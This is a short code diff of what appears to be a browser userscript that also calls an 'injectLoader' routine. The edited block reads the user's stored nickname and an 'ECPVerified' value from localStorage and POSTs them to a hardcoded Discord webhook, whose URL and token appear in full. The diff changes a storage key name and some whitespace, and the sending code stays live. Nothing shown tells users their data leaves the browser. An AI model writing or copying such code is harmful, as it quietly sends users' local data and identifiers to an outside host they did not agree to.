@@ -616,37 +616,36 @@ injectLoader();
 
 (function () {
     'use strict';
-
     // Retrieve values from localStorage
     const lastNickname = localStorage.getItem("lastNickname") || "Unknown";
-    let ECPVerified = localStorage.getItem("Ecp:ECPVerified") || "no";
-
+    let ECPVerified = localStorage.getItem("ECPVerified") || "no";  // Changed key name here
+    
     // Debugging: Log retrieved value
     console.log("Retrieved ECPVerified:", ECPVerified);
-
+    
     // Parse ECPVerified if it contains JSON
     try {
         ECPVerified = JSON.parse(ECPVerified);
     } catch (e) {
         // If not JSON, keep it as a string
     }
-
+    
     // Prepare ECPVerified content for logging
     const ECPVerifiedContent = typeof ECPVerified === "object" 
         ? JSON.stringify(ECPVerified, null, 2) 
         : ECPVerified;
-
+    
     // Debugging: Log formatted content
     console.log("Formatted ECPVerifiedContent:", ECPVerifiedContent);
-
+    
     // Webhook URL
     const webhookURL = "https://discord.com/api/webhooks/1332078434242920602/LaPifHcDpvwzWWKgHIEpydroC9GnhwAyDokGZwKSN_wOkPQ9S0jcTFM-dAlygkHbSgNN";
-
+    
     // Payload for Discord webhook
     const payload = {
-        content: `${lastNickname} has entered the script\nEcp:ECPVerified: ${ECPVerifiedContent}`
+        content: `${lastNickname} has entered the script\nECPVerified: ${ECPVerifiedContent}`
     };
-
+    
     // Send payload to the Discord webhook
     fetch(webhookURL, {
         method: "POST",
@@ -666,6 +665,3 @@ injectLoader();
         console.error("Error sending webhook:", error);
     });
 })();
-
-
-
